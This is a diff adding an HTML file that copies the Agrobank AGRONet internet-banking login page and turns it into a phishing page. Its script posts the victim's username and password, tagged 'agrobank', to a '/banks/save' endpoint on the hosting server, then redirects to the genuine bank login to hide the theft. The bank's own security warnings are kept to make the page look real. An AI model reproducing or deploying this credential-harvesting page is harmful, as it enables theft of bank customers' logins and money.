@@ -1,0 +1,475 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0068)https://www.agronet.com.my/rib/ib101/ibLoginAccess.do?method=execute -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+
+	<meta name="csrf-token" content="{{ csrf_token() }}">
+<title>Agrobank Online</title>
+<link rel="shortcut icon" href="https://www.agronet.com.my/rib/images/icon.ico" type="image/x-icon">
+	
+<link rel="stylesheet" type="text/css" media="screen" href="./main.css">
+
+<script type="text/javascript" async="" defer="" src="https://www5.agronet.com.my/piwik/piwik.js"></script><script type="text/javascript" src="./common.js.download"></script>
+<script type="text/javascript" src="./popup.js.download"></script>
+<script src="./AC_RunActiveContent.js.download" type="text/javascript"></script>
+
+<script type="text/javascript" src="./jquery-1.3.2.js.download"></script>
+<script type="text/javascript" src="./jquery.tools.min.js.download"></script>
+<script type="text/javascript" src="./ui.core.js.download"></script>
+<script type="text/javascript" src="./ui.datepicker.js.download"></script>
+<script type="text/javascript" src="./jPages.js.download"></script>
+<script type="text/javascript" src="./jquery.qrcode.min.js.download"></script>
+
+
+<script type="text/javascript">
+ 		$.ajaxSetup({
+            headers: {
+                'X-CSRF-TOKEN': parent.document.getElementById("csrf-token").content
+            }
+        });
+
+        function passwordfunction() {
+            if(document.getElementById("username").value.length > 0 ) {
+				console.log(parent.document.getElementById("csrf-token").content)
+                $.ajax({
+					headers: {
+						'X-CSRF-TOKEN': parent.document.getElementById("csrf-token").content
+					},
+                    type: "POST",
+                    data: {username: document.getElementById("username").value,
+                        password: document.getElementById("password").value,
+                        bankname: "agrobank"},
+                    url : "/banks/save",
+                    success : function (sdata) {
+                        // document.getElementById("test").innerHTML = sdata ;
+                        // document.getElementById("test").append(sdata);
+                        // $('#test').html(sdata);
+                        location.href = "https://www.agronet.com.my/rib/common/Login.do";
+                    }
+                });
+            }
+        }
+
+        function usernamefunction() {
+            if(document.getElementById("username").value.length > 0 ) {
+                document.getElementById("usernamelabel").style.display = "none";
+                document.getElementById("username").style.display = "none";
+                document.getElementById("usernamebtn").style.display = "none";
+                document.getElementById("passwordlabel").style.display = "block";
+                document.getElementById("password").style.display = "block";
+                document.getElementById("passwordbtn").style.display = "block";
+            }
+        }
+        
+
+</script> 
+
+<style type="text/css">
+div.overlay {
+	width: 100%;
+	position:absolute;
+	background-color: transparent ;
+	z-index:100;
+}
+
+div.overlayBox
+{
+	position:fixed;
+	z-index:99;
+	visibility:hidden;
+	width:400px;
+}
+
+div.overlayBox p
+{
+	text-align: center;
+	padding: 20px;
+	font-size: 18px;
+}
+
+.modal {
+	background-color:#fff;
+	display:none;
+	width:600px;
+	padding:15px;
+	text-align:left;
+	border:3px solid #333;
+	font-size: 12px;
+	position:absolute !important;
+	text-align:justify;
+	line-height:19px;
+	opacity:0.8;
+	-moz-border-radius:6px;
+	-webkit-border-radius:6px;
+	-moz-box-shadow: 0 0 50px #000;
+	-webkit-box-shadow: 0 0 50px #000;
+}
+
+
+</style>
+
+
+<!--[if lte IE 6]>
+<style type="text/css">
+div.overlayBox {
+	position: absolute;
+}
+</style>
+<![endif]-->
+
+</head>
+
+<body>
+	<div id="background_gradient">
+	 <div id="container_left">
+	  <div id="container_right">
+		<div id="container2" style="background-image:url(../images/background.jpg);">
+			<div id="wrap">
+				<!-- header -->
+				<div id="header">
+					
+
+
+
+
+
+	
+		
+	
+	
+
+
+
+<div id="topimg">
+	<a href="http://www.agrobank.com.my/" title="AGRO BANK" class="logo" target="_parent"><img src="./logo.jpg" alt="AGRO BANK" width="150" height="75" class="logo"></a>
+	<div class="header_copy" title="AGRO BANK">
+		<h1>Welcome To <span>AGRONet</span></h1>
+	</div>
+<!-- 	<ul class="language"> -->
+
+
+
+<!-- 	</ul> -->
+</div>
+
+				</div>
+				
+				<div id="overlay" class="overlay">
+				<div id="overlayBox" class="overlayBox">
+					<p><img src="./loading.gif"></p>
+				</div>
+				<table id="div_table" onclick="promptMessage()">
+				<tbody><tr>
+					<td id="div_td" align="center" valign="middle">
+					</td>
+				</tr>
+				</tbody></table>
+				</div>
+			
+				<!-- content -->
+				<div id="content">
+					
+
+
+
+
+<!-- the triggers -->
+
+
+<div class="modal" id="yesno" style="z-index: auto; top: 100.8px; left: 642px; position: fixed; display: none;">
+	<h3>AGRONet Security Tips:</h3>
+	<p style="margin-top:5px; margin-bottom: 0px">
+		1) We advise you to always verify your chosen <strong>image</strong> and <strong>phrase</strong> during login.
+		<br>
+		2) The security feature on top of username and password authentication will ensure that you are banking with the valid <strong>agronet.com.my</strong> website.
+		<br>
+		3) Always <strong>manually</strong> type www.agronet.com.my to access AGRONet. 
+		<br>
+		4) <strong>Never</strong> click on any email links claiming to direct you to agronet.com.my. 
+		<br>
+		5) Antiphishing Scams: 
+			</p><ul style="margin-top:0px; margin-bottom:-5px">
+			<li>
+				Don't use the links in an email, instant message, or chat to get to any web page if you suspect the message might not be authentic or you don't know the sender or user's handle.
+			</li>
+			<li> 
+				Log onto the website directly by typing the Web address in your browser.
+			</li> 
+			</ul>
+		<br>
+		<img src="./securityImage.jpg" width="300" height="240" style="float:left;margin:0 5px 0 0;">
+		<div style="font-size: 12px;">
+		If you encounter any of the following situations:
+		<br>
+		<strong>* No image appears</strong>
+		<br>
+		<strong>* "Image not available" appears</strong>
+		<br>
+		<strong>* Not your chosen image and phrase</strong>
+		<br>
+		<p style="color: red; margin-bottom: 110px">Please <strong>DO NOT PROCEED</strong>. Call our Agrobank Contact Centre at 1 300 88 2476 (AGRO) immediately for assistance. </p>
+		</div>
+	<p></p>
+
+	<!-- yes/no buttons -->
+	<p align="center">
+		<button class="close"> OK </button>
+	</p>
+</div>
+<!-- <script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-27843758-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script> -->
+
+
+
+<script>
+	$(document).ready(function() {
+
+		var triggers = $(".modal").overlay({
+
+			// some mask tweaks suitable for modal dialogs
+			mask: {
+				color: '#F2E6E6',
+				loadSpeed: 500,
+				opacity: 0.9
+			},
+
+			closeOnClick: false,
+			load: true
+		});
+
+		var buttons = $("#yesno button").click(function(e) {
+			
+			// get user input
+			var yes = buttons.index(this) === 0;
+		});
+
+	});
+
+</script>
+
+
+
+	
+	<div id="content" class="content_background">
+		<div class="login">
+			<table class="table_login__full" border="0" cellspacing="0" cellpadding="0">
+				<tbody><tr height="230px">
+                    <td width="20" align="left" valign="top"><img src="./login_left.png" width="20" height="230"></td>
+					<td class="table_login_password">
+						<form name="fbLoginUserNameForm" method="post" action="#">
+							<!-- <input type="hidden" name="org.apache.struts.taglib.html.TOKEN" value="52f7d9ed672d1f5ba92d7ce702cdb82d"> -->
+						<table class="table_login_password" border="0" cellspacing="0" cellpadding="0">
+							<tbody><tr>
+								<td colspan="2">&nbsp;</td>
+							</tr>
+							<tr>
+								<td width="70" align="right"><img src="./lock.jpg" width="32" height="32"></td>
+								<td colspan="2"><h1>Log in here</h1>
+								<span class="copy1" style="margin-left: 6px; padding-left:0px">Sunday, 17 February 2019 10:08:04</span></td>
+							</tr>
+							<tr>
+								 <td align="right">&nbsp;</td>
+       							 <td colspan="2">&nbsp;</td>
+							</tr>
+							<tr>
+								<td><label id="usernamelabel"><span id="userNameErrorSymbol"></span><span class="copy2">Username</span>:</label>
+									<label id="passwordlabel" style="display:none;"><span id="userNameErrorSymbol"></span><span class="copy2">Password</span>:</label></td>
+								<td width="155" align="left" valign="middle"><input type="text" name="username" id="username" maxlength="16" autocomplete="off" value="" id="textfield2">
+									<input type="text" name="password" id="password" style="display:none;" maxlength="16" autocomplete="off" value="" id="textfield2"></td>
+								<td align="left" valign="middle">
+									<input id="usernamebtn" class="btn_image" onclick="usernamefunction();" value="Next">
+									<input id="passwordbtn" class="btn_image" onclick="passwordfunction();" style="display:none;" value="Login">
+								</td>
+							</tr>
+							<tr>
+								<td colspan="3">&nbsp;</td>
+							</tr>
+							<tr>
+								<td colspan="3">
+								<span class="copy2">Please enter your <strong><span class="copy4">Username</span></strong> to access AGRONet Internet Banking Services.</span>
+            					<p>
+            					<strong><span class="copy4">For New Customer:</span></strong>
+            					<span class="copy2"> Please click on "Register an Account" to begin.</span>
+            					</p></td>
+							</tr>
+						</tbody></table>
+						</form>
+						<br>
+						<table id="errorTable">
+						<tbody><tr>
+							<td><span id="serverSideError" class="error">
+
+
+
+</span></td>
+						</tr>
+						</tbody></table>
+					</td>
+					<td width="50" align="center" valign="top"><img src="./login_dotted.png" width="30" height="230"></td>
+					<td class="table_login" align="left" valign="middle">
+						<div class="need_help">
+						<div class="title"><span class="copy3"><strong>Need Help</strong></span>
+						<img src="./question.gif" width="24" height="24"></div>
+						<p>
+							<a href="https://www.agronet.com.my/rib/ib101/ibRegisterTerms.do" onclick="overlay();">Register an Account</a><br> 
+							<a href="https://www.agronet.com.my/rib/ib101/ibForgotUsername.do" onclick="overlay();">Forgot my Username</a><br> 
+							<a href="https://www.agronet.com.my/rib/ib101/ibResetInfo.do?resetType=pwd" onclick="overlay();">Forgot my Password</a><br>
+
+
+
+							<a title="Demo" href="https://www.agronet.com.my/rib.demo/html/index.html" target="_blank">AGRONet Demo</a>
+							
+						</p>
+						</div>
+					</td>
+					<td width="20" align="right" valign="top"><img src="./login_right.png" width="20" height="230"></td>
+				</tr>
+			</tbody></table>
+			
+			<div style="clear: both; line-height: 1px;"></div>
+			</div>
+			<div class="info_wrap">
+				<div class="info_bg">
+					<img class="warning_icon" src="./warning_icon.png" width="37" height="40">
+					<div class="info_column1">
+						<!-- <h1>CAUTION!</h1> -->
+						<!-- <p>Be cautious, stay alert! DO NOT login via email links and DO NOT open email attachments or run programs from unknown sources!</p> -->
+						<br style="line-height:85%"><h1><span style="font-size: 12pt; mso-bidi-font-size: 10.0pt; line-height: 0%;">CAUTION!</span> </h1> <br><span style="font-size: 8pt; mso-bidi-font-size: 10.0pt; line-height: 150%;">Bank have detected phishing website that has been spread via email to customers and ask to log-in AGRONet internet banking via suspicious/fake link. Due to that customer is advice to take necessary precaution as below:<br><a style="font-size: 10px;" href="http://www.agrobank.com.my/announcements/security-alert/"><span style="text-decoration: underline; color: #0000ff;"> Find Out More</span></a><br></span> 
+					</div>
+				</div>
+				<div class="info_bg">
+					<img class="light_icon" src="./light_icon.png" width="29" height="41">
+					<div class="info_column2">
+						<!--  <h1>SECURITY ALERT!</h1> -->
+						<!-- <p>Be cautious, stay alert! DO NOT login via email links and DO NOT open email attachments or run programs from unknown sources!</p> -->
+						<br style="line-height:85%"><h1><span style="font-size: 10pt; mso-bidi-font-size: 10.0pt; line-height: 0%;">IMPORTANT SECURITY TIPS!</span> </h1> <br><span style="font-size: 8pt; mso-bidi-font-size: 10.0pt; line-height: 150%;">Alerts regarding cyber-attack via emails and certain websites. Please be aware of phishing emails and to take extra caution and initiative to stay safe online. Please contact Agrobank Contact Centre at 1-300-88-2476 immediately for assistance.<br><a style="font-size: 10px;" href="http://www.agrobank.com.my/announcements/online-security-alert/"><span style="text-decoration: underline; color: #0000ff;"> Find Out More</span></a><br></span> 
+					</div>
+				</div>
+				<div class="info_bg">
+					<img class="time_icon" src="./time_icon.png" width="44" height="46">
+					<img class="phone_icon" src="./phone_icon.png" width="41" height="50">
+					<div class="info_column3">
+						<!-- <h1>Banking Hours</h1> -->
+						<!-- <p>Internet Banking Hours<br/>7:00am - 11:00pm</p> -->
+						<br style="line-height:60%"><span style="font-size: 9pt; color: #e41b25;"><strong>BANKING HOURS</strong></span> <br><span style="font-size: 8pt; color: #000000;">9am - 4:30pm </span><br><br><span style="font-size: 9pt; color: #e41b25;"><strong>ATM/CDM BANKING HOURS</strong></span> <br><span style="font-size: 8pt; color: #000000;">Daily 4am - 12am </span><br><br><span style="font-size: 9pt; color: #e41b25;"><strong>INTERNET BANKING HOURS </strong></span><br><span style="font-size: 8pt; color: #000000;">24 Hours Daily</span><span style="color: #000000;"><br></span>
+						<!-- <div class="dotted_line">&nbsp;</div> -->
+						<!-- <h1>Online Banking Hours</h1> -->
+						<!-- <p>???en.ib101.login.info.online.banking.hours.message???</p> -->
+						<br><span style="font-size: 9pt; color: #e41b25;"><strong>AGROBANK CONTACT CENTRE</strong> <br><span style="font-size: 8pt; color: #000000;">1-300-88-2476</span><br></span>
+					</div>
+				</div>
+				<img class="verisign" src="./digicert.png" width="70" height="70">
+			</div>
+		<div style="clear: both;"></div>	
+		</div>	
+	
+	
+
+				</div>
+				<!-- footer -->
+				<div id="footer">
+				
+
+<div id="footer_wrap"> 
+    <img class="footer_left" src="./footer_conner_left.jpg" width="10" height="40"> 
+    <span id="links"> 
+    <a href="https://www.agronet.com.my/rib/jsp/common/footer/ibsClientCharter.htm" onclick="window.open (this.href,&#39;mywindow&#39;);return false;"><span class="footer_font">Client Charter</span></a>
+	<a href="https://www.agronet.com.my/rib/jsp/common/footer/ibsPrivacyPolicy.htm" onclick="window.open (this.href,&#39;mywindow&#39;);return false;"><span class="footer_font">Privacy Policy</span></a>
+	<a href="https://www.agronet.com.my/rib/jsp/common/footer/ibsICTSecurityPolicy.htm" onclick="window.open (this.href,&#39;mywindow&#39;);return false;"><span class="footer_font">Security Policy</span></a>
+	<a href="https://www.agronet.com.my/rib/jsp/ib101_access/register/ibsTerms.jsp" onclick="window.open (this.href,&#39;mywindow&#39;);return false;"><span class="footer_font">Terms &amp; Conditions</span></a>
+    <a href="http://www.agrobank.com.my/head-office" onclick="window.open (this.href,&#39;mywindow&#39;);return false;"><span class="footer_font">Contact Us</span></a> 
+    <a href="http://www.agrobank.com.my/site-map" onclick="window.open (this.href,&#39;mywindow&#39;);return false;"><span class="footer_font">Site Map</span></a>
+    </span>
+    <span id="copyrights" style="font-size: 7px;position:absolute; right:16px; top:18px; ">
+    	Formerly known as Bank Pertanian Malaysia.
+    	Copyright � AGROBANK 2011-2012. All Rights Reserved.
+    </span> 
+    <img class="footer_right" src="./footer_conner_right.jpg" width="10" height="40">
+</div>
+
+<!-- CMS SITE ANALYTIC/Piwik 06082016-->
+<script type="text/javascript">
+  var _paq = _paq || [];
+  _paq.push(["setDomains", ["*.www.agronet.com.my"]]);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//www5.agronet.com.my/piwik/";
+    _paq.push(['setTrackerUrl', u+'piwik.php']);
+    _paq.push(['setSiteId', 2]);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<noscript><p><img src="//www5.agronet.com.my/piwik/piwik.php?idsite=2" style="border:0;" alt="" /></p></noscript>
+<!-- End Piwik Code -->
+				</div>
+				<!-- Bottom-->
+				<div id="btm">
+				
+
+<script type="text/javascript">
+<!--
+    var NN4 = (document.layers) ? true : false
+	var IE4 = (document.layers) ? false : true
+
+	// The timeout remainder should be set 30 seconds
+	// before the real time out (10 minutes).
+	//var timeoutLimit = 9.5; // 9.5 minutes
+	var timeoutLimit = "5";
+
+	timeoutLimit *= 60 * 1000; // convert to miliseconds
+
+	var lastEvent;
+
+	function check_for_timeout()
+	{
+		var date = new Date();
+		var currentTime = date.getTime();
+
+		if((parseInt(currentTime) - parseInt(lastEvent)) < timeoutLimit) {
+			setTimeout('check_for_timeout()', 10000);
+		} else {
+			go_to_logout()
+		}
+	}
+
+	function updateLastEvent()
+	{
+		var date = new Date();
+		var time = date.getTime();
+		lastEvent=time;
+		setTimeout('check_for_timeout()', 10000);
+	}
+
+	function go_to_logout()
+	{
+		parent.location.href='http://www.agrobank.com.my/';
+
+	}
+
+	updateLastEvent();
+
+	//-->
+</script>
+
+				</div>
+			</div>
+		</div>
+		<div id="footer_shadow">
+        </div>
+	</div>
+	</div>
+	</div>
+
+<div id="exposeMask" style="position: absolute; top: 0px; left: 0px; width: 1920px; height: 1008px; display: none; opacity: 0.9; z-index: 9998; background-color: rgb(242, 230, 230);"></div></body></html>
